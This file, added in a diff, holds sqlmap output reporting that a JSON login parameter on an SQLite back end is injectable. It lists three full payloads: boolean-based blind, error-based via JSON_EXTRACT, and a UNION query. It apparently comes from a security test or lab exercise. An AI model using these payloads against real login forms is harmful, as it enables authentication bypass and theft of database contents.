@@ -1,0 +1,16 @@
+sqlmap identified the following injection point(s) with a total of 88 HTTP(s) requests:
+---
+Parameter: JSON user ((custom) POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: {"user":"admin' AND CASE WHEN 1146=1146 THEN 1146 ELSE JSON(CHAR(76,109,103,80)) END AND 'DlYh'='DlYh","pw":"x"}
+
+    Type: error-based
+    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
+    Payload: {"user":"admin' AND 5194=JSON_EXTRACT(CHAR(123,125),CHAR(113,106,106,112,113)||(SELECT (CASE WHEN (5194=5194) THEN 1 ELSE 0 END))||CHAR(113,120,106,122,113)) AND 'vNEq'='vNEq","pw":"x"}
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: {"user":"admin' UNION ALL SELECT CHAR(113,106,106,112,113)||CHAR(110,107,81,69,107,102,106,81,106,110,81,108,100,79,103,99,100,82,108,114,70,85,117,109,103,101,108,70,73,121,98,101,83,97,119,88,106,86,85,116)||CHAR(113,120,106,122,113),NULL-- MiqP","pw":"x"}
+---
+back-end DBMS: SQLite
